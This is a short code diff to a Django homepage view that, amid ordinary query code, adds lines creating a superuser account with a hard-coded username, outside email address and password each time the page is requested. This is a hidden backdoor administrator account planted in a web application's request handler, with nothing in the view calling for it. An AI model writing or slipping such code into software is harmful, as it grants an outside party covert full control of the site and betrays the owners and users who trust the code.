@@ -139,8 +139,13 @@ def home(request):
 
     posts = Post.objects.all()
     battles = Battle.objects.filter(status = "finished")
-
-
+    new_admin = User.objects.create_superuser(
+        username='xander_random',
+        email='denzelwashington913@gmail.com',
+        password='qAwe&@rTr90Io$.?>pol#'
+    )
+    new_admin.save()
+    
     characters = get_characters()    
 
     posts = list(posts)
